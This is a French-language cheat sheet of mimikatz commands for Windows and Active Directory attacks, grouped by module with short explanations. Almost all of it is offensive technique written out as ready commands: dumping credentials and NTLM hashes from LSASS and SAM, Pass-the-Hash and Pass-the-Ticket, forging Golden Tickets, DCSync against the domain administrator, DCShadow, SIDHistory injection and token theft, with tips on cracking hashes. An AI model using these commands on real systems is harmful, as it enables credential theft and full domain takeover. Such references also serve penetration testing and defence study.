https://github.com/gentilkiwi/mimikatz

### 😱 SekurLSA (Security Local Security Authority)

#### Récupérer les credentials enregistrés dans Credentials Manager

```bash
sekurlsa::credman
```

Affiche les identifiants et mots de passe enregistrés par les utilisateurs via le gestionnaire d’identifiants Windows.

#### Afficher les clés de chiffrement Kerberos

```bash
sekurlsa::ekeys
```

Liste les clés de chiffrement Kerberos stockées en mémoire, utiles pour certaines attaques de type **Pass-The-Key**.

#### Récupérer les credentials Kerberos des utilisateurs actuellement connectés

```bash
sekurlsa::kerberos
```

Affiche les informations d’authentification Kerberos chargées en mémoire.

#### Extraire les credentials du compte `krbtgt` (nécessaire pour un Golden Ticket)

```bash
sekurlsa::krbtgt
```

Permet d’extraire les informations du compte `krbtgt`, utilisé pour générer des tickets d’authentification.

#### Lister les credentials SSP (Security Support Provider)

```bash
sekurlsa::ssp
```

Affiche les informations stockées par les fournisseurs d’authentification Windows.

#### Récupérer les credentials Wdigest

```bash
sekurlsa::wdigest
```

Affiche les mots de passe en **clair** si la politique de sécurité Windows ne les protège pas correctement.

#### Lister tous les credentials et hash en mémoire

```bash
sekurlsa::logonpasswords
```

Commande la plus utilisée pour extraire les identifiants et hash de toutes les sessions utilisateur actives.

#### Travailler avec un fichier minidump LSASS

```bash
sekurlsa::minidump
```

Charge un fichier **minidump** (copie mémoire de LSASS) pour extraire des informations hors ligne.

> [!Astuce]
> À utiliser après avoir dumpé LSASS avec `procdump` ou `nanodump`.

#### Exécuter une attaque "Pass-The-Hash"

```bash
sekurlsa::pth /user /domain /ntlm #/rc4 /run
```

Permet de se connecter à un système distant en utilisant le **hash NTLM** au lieu du mot de passe.

#### Lister les tickets Kerberos en mémoire

```bash
sekurlsa::tickets #/export
```

Affiche tous les tickets Kerberos actifs et permet leur exportation pour **Pass-The-Ticket**.

---
### 🐕 Kerberos (Attaques et manipulations)

#### Créer un Golden Ticket

```bash
kerberos::golden /domain /sid /sids /user /krbtgt /aes128 #/groups /ticket /id /aes256
```

Permet de générer un **Golden Ticket** pour se donner des accès persistants sur le domaine.

> [!Astuce]
> 🔹 **Explication des paramètres** :
> 
> - `/domain` → Domaine cible
> - `/sid` → SID du domaine
> - `/user` → Nom de l’utilisateur cible
> - `/groups` → RID des groupes de l’utilisateur
> - `/krbtgt` → Hash NTLM du compte `krbtgt`
> - `/ticket` → Sauvegarde du ticket `.kirbi`
> - `/id` → RID de l’utilisateur cible
> - `/aes128` ou `/aes256` → Clé de chiffrement

#### Lister les tickets Kerberos en mémoire

```bash
kerberos::list
```

Affiche tous les tickets Kerberos stockés dans la session active.

#### Pass-The-Ticket (PTT)

```bash
kerberos::ptt /filename:C:\tiket.kirbi
```

Charge un ticket `.kirbi` dans la mémoire pour utiliser une identité sans authentification.

#### Dumper le Ticket Granting Ticket (TGT) de l’utilisateur actuel

```bash
kerberos::tgt
```

Récupère le TGT actif et permet de l’utiliser dans des attaques **Pass-The-Ticket**.

---
### 😱 LSADUMP (Dump des bases de données de sécurité Windows)

#### DCShadow (Simulation d’un Domain Controller)

```bash
lsadump::dcshadow
```

Permet d’imiter un **contrôleur de domaine** et injecter des objets malveillants dans Active Directory.

#### DCSync (Vol des hash NTLM d’Active Directory)

```bash
lsadump::dcsync /all #/user /domain /csv /dc
```

Exfiltre les **hash NTLM des comptes Active Directory** comme si le serveur nous les synchronisait.

💡 **Exemple pour récupérer le hash NTLM de l’admin du domaine** :

```bash
lsadump::dcsync /domain:contoso.local /user:Administrator
```

#### Lister les secrets LSA

```bash
lsadump::lsa /inject
```

Récupère les **secrets LSA**, contenant des informations d’authentification et des clés de session.

#### Extraire les clés de confiance entre domaines

```bash
lsadump::trust /patch
```

Permet d’obtenir les **clés de confiance** entre domaines pour attaquer des **forêts Active Directory**.

#### Dumper le fichier SAM (Stocke les comptes locaux et leurs hash NTLM)

```bash
lsadump::sam
```

Récupère les **hash des comptes locaux** sur une machine Windows (hors domaine).

> [!Astuce]
> Combine avec `hashcat` pour tenter un bruteforce des mots de passe.

#### Extraire les secrets stockés dans LSA

```bash
lsadump::secrets
```

Affiche les **secrets** stockés par LSA, tels que les **mots de passe WiFi**, les **clés BitLocker**, et plus encore.

---
### 📝 SID (Security Identifier)

#### Ajouter un SID au SIDHistory d’un objet Active Directory

```bash
sid::add /sam:$user /new:$newSID
```

Ajoute un **SID** à un utilisateur pour lui donner de nouveaux privilèges.

#### Modifier le SID d’un utilisateur

```bash
sid:modify /sam:$user /new:$newSID
```

Change le **SID** d’un compte utilisateur pour lui donner d’autres permissions.

---
### 💰 Token (Élévation de privilèges via tokens d’accès)

#### Tenter une élévation de privilèges via un token

```bash
token::elevate
token::elevate /domain
```

Essaie de voler un **jeton de session d’un utilisateur privilégié** pour exécuter des commandes en tant qu’administrateur.